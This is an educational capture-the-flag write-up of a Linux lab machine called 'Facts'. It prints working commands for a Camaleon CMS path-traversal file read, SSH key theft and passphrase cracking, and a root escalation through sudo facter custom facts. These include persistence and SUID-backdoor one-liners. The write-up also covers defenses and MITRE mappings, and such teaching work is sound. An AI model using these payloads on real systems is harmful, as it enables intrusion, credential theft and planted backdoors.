# Facts - Educational Writeup

**Machine:** Facts
**OS:** Linux
**Difficulty:** Easy
**Date Completed:** 2026-02-01

---

## Executive Summary

This machine demonstrates a sophisticated attack chain exploiting a web application vulnerability, credential extraction through file system access, offline password cracking, and sudo privilege abuse. The attack begins with discovering a path traversal vulnerability in Camaleon CMS, allowing arbitrary file read. This leads to extracting an encrypted SSH private key, cracking its passphrase, and gaining initial user access. Privilege escalation is achieved by abusing sudo permissions on the `facter` binary, which allows loading custom Ruby facts that execute as root.

**Attack Chain:** `Camaleon CMS Path Traversal (GHSL-2024-183)` -> `SSH Key Extraction` -> `Passphrase Cracking` -> `SSH Access` -> `sudo facter --custom-dir` -> `root`

---

## Phase 1: Reconnaissance

### What We Did
Performed a comprehensive port scan to identify running services on the target.

```bash
nmap -sC -sV 10.129.8.77
```

### Why We Do This
**Port scanning is always the first step** because we need to know what services are running before we can attack them. The flags used:
- `-sC`: Runs default NSE scripts (provides extra info like service banners, web titles)
- `-sV`: Version detection (tells us exact software versions for CVE research)

### Results
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.x
80/tcp    open  http    nginx (Camaleon CMS)
54321/tcp open  minio   MinIO S3 storage
```

### What This Tells Us
- **Port 22 (SSH):** Remote login service. If we find credentials or keys, we can log in directly.
- **Port 80 (HTTP):** Web server running Camaleon CMS - a Ruby on Rails content management system. Web applications are often the weakest point of entry.
- **Port 54321 (MinIO):** Object storage service. Could contain sensitive files, but requires credentials.

### MITRE ATT&CK Mapping
- **T1046 - Network Service Discovery:** We identified active services to understand the attack surface.

---

## Phase 2: Web Application Discovery

### What We Did
Explored the web application to understand its technology stack and identify potential vulnerabilities.

```bash
# Add hostname to /etc/hosts
echo "10.129.8.77 facts.htb" >> /etc/hosts

# Browse the application
firefox http://facts.htb
```

### Why We Do This
**Web enumeration reveals the application stack and potential entry points.** We're looking for:
1. What CMS/framework is running (each has known vulnerabilities)
2. Authentication mechanisms
3. User registration functionality
4. Admin panels and their locations
5. Known CVEs for the identified software

### Key Discovery: Camaleon CMS 2.9.0

The site runs **Camaleon CMS version 2.9.0** - a Ruby on Rails content management system. This is significant because:
1. Ruby on Rails applications have specific vulnerability patterns
2. We can search for known CVEs against this version
3. CMS platforms often have file management features that can be abused

### Creating an Account

```bash
# Registered a new account on the CMS
# This gave us access to authenticated features
```

### Why Account Creation Matters
**Many vulnerabilities require authentication.** Creating an account:
1. Gives us access to more features and attack surface
2. Allows us to test authenticated vulnerabilities
3. Provides session cookies for automated exploitation
4. Often gives us access to file upload/download features

---

## Phase 3: Exploiting Path Traversal (GHSL-2024-183)

### What We Did
Discovered and exploited a critical path traversal vulnerability in Camaleon CMS.

```bash
# Save authenticated session cookies
# (After logging in via browser, export cookies to file)

# Test path traversal to read /etc/passwd
curl -s -b /tmp/auth_session.txt \
  "http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd"
```

### Why This Works - The Vulnerability Explained

**GHSL-2024-183** is a path traversal vulnerability in Camaleon CMS's media download functionality.

**The Vulnerable Endpoint:**
`/admin/media/download_private_file?file=<filename>`

**The Flaw:**
The application fails to properly sanitize the `file` parameter before using it to construct a file path. By injecting `../` sequences, we can escape the intended media directory and read any file on the system.

**Breakdown of the Payload:**
```
../../../../../../etc/passwd
│ │ │ │ │ │
│ │ │ │ │ └── Go up one directory (/)
│ │ │ │ └──── Go up one directory (var)
│ │ │ └────── Go up one directory (www)
│ │ └──────── Go up one directory (html)
│ └────────── Go up one directory (app)
└──────────── Go up one directory (media)
```

Each `../` moves up one directory level. We use six of them to ensure we reach the filesystem root from any starting location.

### What We Extracted

```bash
# Read /etc/passwd to enumerate users
curl -s -b /tmp/auth_session.txt \
  "http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd"

# Results showed:
# trivia:x:1000:1000::/home/trivia:/bin/bash
# william:x:1001:1001::/home/william:/bin/bash
```

### Why /etc/passwd Is Valuable
**/etc/passwd is always the first file to read** when you have arbitrary file read:
1. Lists all users on the system (usernames for SSH bruteforce)
2. Shows home directories (where to look for SSH keys)
3. Shows user shells (which accounts can log in)
4. Reveals system structure and installed services

### Defense: How to Prevent Path Traversal
1. **Input Validation:** Reject any input containing `../` or `..\\`
2. **Canonicalization:** Resolve the full path and verify it's within allowed directory
3. **Chroot/Sandboxing:** Limit file access to specific directories
4. **Web Application Firewall:** Block suspicious path patterns

### Real-World Impact
Path traversal vulnerabilities have led to massive breaches. Notable examples include:
- Reading configuration files with database credentials
- Extracting SSH keys and certificates
- Accessing source code with hardcoded secrets
- Reading logs with sensitive user data

### MITRE ATT&CK Mapping
- **T1083 - File and Directory Discovery:** Used path traversal to enumerate filesystem structure and user accounts.

---

## Phase 4: SSH Key Extraction and Cracking

### What We Did
Read the user's SSH private key and cracked its passphrase offline.

```bash
# Read trivia's SSH private key
curl -s -b /tmp/auth_session.txt \
  "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519" \
  -o /tmp/trivia_id_ed25519

# Set proper permissions (SSH requires strict permissions)
chmod 600 /tmp/trivia_id_ed25519
```

### Why SSH Keys Are High-Value Targets
**SSH private keys provide persistent, password-less access:**
1. Once you have the key, you can authenticate without knowing passwords
2. Keys are often reused across multiple systems
3. Keys can be copied and used from any attacker machine
4. Even encrypted keys can be cracked offline without detection

### Key Observation: Encrypted Key
When we tried to use the key directly:
```bash
ssh -i /tmp/trivia_id_ed25519 trivia@10.129.8.77
# Prompted for passphrase - the key is encrypted!
```

### Cracking the Passphrase

```bash
# Convert SSH key to John the Ripper format
ssh2john /tmp/trivia_id_ed25519 > /tmp/trivia_ssh.hash

# Crack with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/trivia_ssh.hash
```

### Why ssh2john Is Necessary
**John the Ripper can't directly crack SSH keys.** The `ssh2john` script:
1. Extracts the encryption parameters from the SSH key
2. Converts them into a hash format John understands
3. Preserves the bcrypt/AES parameters for accurate cracking

### Cracking Result
```
dragonballz      (trivia_id_ed25519)
```

**Passphrase found:** `dragonballz`

### Why This Worked
The passphrase `dragonballz` is in the rockyou.txt wordlist because:
1. It's a popular culture reference (Dragon Ball Z anime)
2. Users choose memorable phrases they already know
3. No complexity (lowercase only, dictionary word combination)
4. rockyou.txt contains real passwords from the 2009 RockYou breach

### Gaining SSH Access

```bash
ssh -i /tmp/trivia_id_ed25519 trivia@10.129.8.77
# Passphrase: dragonballz
# SUCCESS! We now have shell access as trivia
```

### User Flag
```bash
cat /home/william/user.txt
# 11f9b16960974a2188a8038cb9c5dec9
```

**Note:** The user flag was in william's home directory but readable by trivia - indicating group permissions or ACLs granting access.

### Defense: Protecting SSH Keys
1. **Strong Passphrases:** Use long, random passphrases (16+ characters)
2. **Key Permissions:** Ensure keys are chmod 600 and in protected directories
3. **Hardware Tokens:** Store keys on hardware security modules (HSMs) or YubiKeys
4. **SSH Agent Forwarding Caution:** Don't forward agent to untrusted hosts
5. **Regular Rotation:** Rotate keys periodically and revoke old ones

### Real-World Impact
SSH key theft is a primary lateral movement technique:
- Cloud environments use SSH keys extensively
- CI/CD pipelines often have deployment keys with broad access
- One compromised key can unlock entire infrastructure segments

### MITRE ATT&CK Mapping
- **T1552.004 - Unsecured Credentials: Private Keys:** Extracted SSH private key from user's home directory.
- **T1110.002 - Brute Force: Password Cracking:** Used John the Ripper to crack the SSH key passphrase offline.

---

## Phase 5: Privilege Escalation via Facter

### What We Did - Enumeration
After getting a shell, we enumerated for privilege escalation vectors.

```bash
# ALWAYS check sudo permissions first
sudo -l
```

### Why sudo -l Is Critical
`sudo -l` shows what commands the current user can run with elevated privileges. This is **the single most important privilege escalation check** because:
1. It's fast (takes 1 second)
2. Misconfigured sudo is extremely common
3. It gives direct root access if exploitable
4. Many admins add "convenience" sudo rules that are actually dangerous

### What We Found

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

**This means:** trivia can run `/usr/bin/facter` as root without a password.

### Researching Facter

```bash
# What is facter?
facter --help
man facter
```

**Facter** is a system profiling tool from Puppet Labs. It:
1. Collects "facts" about the system (OS, CPU, memory, etc.)
2. Reports these facts in structured format (JSON, YAML)
3. **Critically: Supports loading custom Ruby facts from directories**

### The Exploitation Vector: --custom-dir

Facter's `--custom-dir` flag allows loading custom facts from a user-specified directory. Since facter executes Ruby code to generate facts, **custom facts run arbitrary Ruby code.**

### The Exploitation

```bash
# Create a directory for our malicious fact
mkdir -p /tmp/myfacts

# Create a Ruby fact that reads the root flag
echo 'Facter.add(:rootflag) { setcode { Facter::Core::Execution.execute("cat /root/root.txt") } }' > /tmp/myfacts/root.rb

# Run facter with our custom directory as root
sudo /usr/bin/facter --custom-dir /tmp/myfacts rootflag
```

### Why This Works - The Chain of Trust

1. `trivia` can run `facter` with `sudo` (as root)
2. The `--custom-dir` flag loads Ruby files from specified directory
3. `Facter.add()` registers a new fact that runs our code
4. `Facter::Core::Execution.execute()` runs shell commands
5. These commands execute as root because facter runs as root
6. We retrieve the output by querying our custom fact name

### Breaking Down the Malicious Fact

```ruby
Facter.add(:rootflag) {
  # Add a new fact named "rootflag"

  setcode {
    # This block runs when the fact is queried

    Facter::Core::Execution.execute("cat /root/root.txt")
    # Execute a shell command and return its output
  }
}
```

### Root Flag
```
b40af6de59d1026ed4ba07d84c1f5d3f
```

### Alternative Exploitation Methods

```bash
# Get a root shell
echo 'Facter.add(:shell) { setcode { Facter::Core::Execution.execute("/bin/bash -i") } }' > /tmp/myfacts/shell.rb
sudo /usr/bin/facter --custom-dir /tmp/myfacts shell

# Add SSH key for persistence
echo 'Facter.add(:persist) { setcode { Facter::Core::Execution.execute("echo YOUR_PUBLIC_KEY >> /root/.ssh/authorized_keys") } }' > /tmp/myfacts/persist.rb
sudo /usr/bin/facter --custom-dir /tmp/myfacts persist

# Create a backdoor SUID shell
echo 'Facter.add(:suid) { setcode { Facter::Core::Execution.execute("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash") } }' > /tmp/myfacts/suid.rb
sudo /usr/bin/facter --custom-dir /tmp/myfacts suid
```

### Defense: Securing Facter in Sudo

**Never allow facter with --custom-dir in sudoers:**
```sudoers
# DANGEROUS - allows arbitrary code execution:
trivia ALL=(ALL) NOPASSWD: /usr/bin/facter

# STILL DANGEROUS - wildcards can be bypassed:
trivia ALL=(ALL) NOPASSWD: /usr/bin/facter *

# SAFER - only allow specific facts without custom-dir:
trivia ALL=(ALL) NOPASSWD: /usr/bin/facter os memory networking
```

**Better approaches:**
1. Use dedicated service accounts for Puppet/Facter
2. Run facter through a wrapper script that filters arguments
3. Use Ansible or other tools that don't require sudo for profiling
4. Implement AppArmor/SELinux profiles to restrict facter execution

### Real-World Impact
Misconfigured sudo permissions on Puppet ecosystem tools are common because:
- DevOps teams need system information gathering
- Puppet/Facter are widely deployed in enterprises
- Administrators don't realize --custom-dir enables code execution
- Many organizations allow facter for "read-only" system info

### MITRE ATT&CK Mapping
- **T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching:** Exploited sudo permissions on facter to execute commands as root.

---

## Flags Captured

| Flag | Value | Location |
|------|-------|----------|
| User | `11f9b16960974a2188a8038cb9c5dec9` | /home/william/user.txt |
| Root | `b40af6de59d1026ed4ba07d84c1f5d3f` | /root/root.txt |

---

## Key Lessons Learned

### 1. Path Traversal Enables Deep Access
**What:** The path traversal in Camaleon CMS allowed reading any file on the filesystem.
**Why:** Web applications that handle file paths must validate input rigorously. A single vulnerable endpoint can expose the entire filesystem.
**Defense:** Implement strict input validation, use chroot jails, and employ web application firewalls.

### 2. SSH Keys Are High-Value Targets
**What:** Reading the SSH private key gave us persistent access after cracking.
**Why:** SSH keys provide passwordless authentication. Even encrypted keys can be cracked offline without alerting defenders.
**Defense:** Use strong passphrases, restrict key file permissions, implement hardware key storage, and monitor for unauthorized SSH access.

### 3. Weak Passphrases Fall to Wordlists
**What:** The passphrase "dragonballz" was cracked in seconds using rockyou.txt.
**Why:** Users choose memorable passphrases from popular culture. Standard wordlists contain millions of such passwords.
**Defense:** Enforce minimum passphrase length, use passphrase generators, and implement key management policies.

### 4. sudo -l Should Be Your First Command
**What:** Running `sudo -l` immediately revealed the facter privilege escalation path.
**Why:** Misconfigured sudo is one of the most common privilege escalation vectors. It takes one second to check.
**Defense:** Audit sudoers configurations regularly, avoid NOPASSWD where possible, and restrict commands to specific arguments.

### 5. Development Tools Have Hidden Powers
**What:** Facter's `--custom-dir` flag enables arbitrary Ruby code execution.
**Why:** DevOps and development tools often have powerful features that become dangerous with elevated privileges.
**Defense:** Research tools thoroughly before granting sudo access, create wrapper scripts that filter dangerous flags, and use principle of least privilege.

### 6. Chain Vulnerabilities for Maximum Impact
**What:** This attack required chaining four distinct vulnerabilities.
**Why:** Single vulnerabilities often have limited impact. Chaining creates paths from nothing to root.
**Defense:** Defense in depth - securing one layer can break the entire chain.

---

## Tools Used

| Tool | Purpose | Why This Tool |
|------|---------|---------------|
| nmap | Port scanning | Industry standard, reliable service detection |
| curl | HTTP requests | Scriptable, supports cookies, custom headers |
| ssh2john | Hash extraction | Converts SSH keys to crackable format |
| John the Ripper | Password cracking | Fast, supports many hash types, GPU acceleration |
| ssh | Remote access | Encrypted shell access with key authentication |
| facter (sudo) | Privilege escalation | Target's own tool turned against it |

---

## Attack Path Diagram

```
+---------------------------------------------------------------+
|                      RECONNAISSANCE                            |
|  nmap scan -> Found ports 22 (SSH), 80 (HTTP), 54321 (MinIO)  |
+---------------------------------------------------------------+
                              |
                              v
+---------------------------------------------------------------+
|                  WEB APPLICATION ANALYSIS                      |
|  Discovered Camaleon CMS 2.9.0 (Ruby on Rails)                |
|  Created user account for authenticated access                 |
+---------------------------------------------------------------+
                              |
                              v
+---------------------------------------------------------------+
|              PATH TRAVERSAL EXPLOITATION                       |
|  GHSL-2024-183: /admin/media/download_private_file            |
|  file=../../../../../../etc/passwd -> enumerated users         |
|  WHY: Missing input sanitization on file parameter             |
+---------------------------------------------------------------+
                              |
                              v
+---------------------------------------------------------------+
|                  SSH KEY EXTRACTION                            |
|  file=../../../../../../home/trivia/.ssh/id_ed25519           |
|  Retrieved encrypted Ed25519 private key                       |
|  WHY: Weak file permissions, predictable key location          |
+---------------------------------------------------------------+
                              |
                              v
+---------------------------------------------------------------+
|                 PASSPHRASE CRACKING                            |
|  ssh2john + John the Ripper + rockyou.txt                     |
|  Passphrase: dragonballz                                       |
|  WHY: Weak passphrase based on popular culture reference       |
+---------------------------------------------------------------+
                              |
                              v
+---------------------------------------------------------------+
|                    INITIAL ACCESS                              |
|  ssh -i id_ed25519 trivia@facts.htb                           |
|  User flag: 11f9b16960974a2188a8038cb9c5dec9                  |
+---------------------------------------------------------------+
                              |
                              v
+---------------------------------------------------------------+
|                PRIVILEGE ESCALATION                            |
|  sudo -l -> (ALL) NOPASSWD: /usr/bin/facter                   |
|  Created malicious Ruby fact with --custom-dir                 |
|  WHY: Unrestricted sudo on tool with code execution feature    |
+---------------------------------------------------------------+
                              |
                              v
+---------------------------------------------------------------+
|                      ROOT ACCESS                               |
|  sudo facter --custom-dir /tmp/myfacts rootflag               |
|  Root flag: b40af6de59d1026ed4ba07d84c1f5d3f                  |
+---------------------------------------------------------------+
```

---

## Credentials Summary

| Service | Username | Password/Key | How Found |
|---------|----------|--------------|-----------|
| Camaleon CMS | testuser | [created account] | User registration |
| SSH | trivia | SSH key + passphrase: dragonballz | Path traversal + cracking |

---

## MITRE ATT&CK Framework Mapping

| Technique ID | Technique Name | How Used |
|--------------|----------------|----------|
| T1046 | Network Service Discovery | Nmap port scan to identify services |
| T1083 | File and Directory Discovery | Path traversal to read /etc/passwd and enumerate users |
| T1552.004 | Unsecured Credentials: Private Keys | Extracted SSH private key from user's home directory |
| T1110.002 | Brute Force: Password Cracking | Cracked SSH key passphrase with John the Ripper |
| T1021.004 | Remote Services: SSH | Used stolen SSH key to access system |
| T1548.003 | Abuse Elevation Control Mechanism: Sudo | Exploited sudo facter for root access |

---

## References

- [GHSL-2024-183 - Camaleon CMS Path Traversal](https://github.com/advisories/GHSA-7x4w-cj9r-h4v9)
- [GTFOBins - Facter](https://gtfobins.github.io/gtfobins/facter/)
- [Puppet Facter Custom Facts Documentation](https://puppet.com/docs/puppet/latest/custom_facts.html)
- [John the Ripper - SSH Key Cracking](https://github.com/openwall/john)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [SSH Key Security Best Practices](https://www.ssh.com/academy/ssh/key)
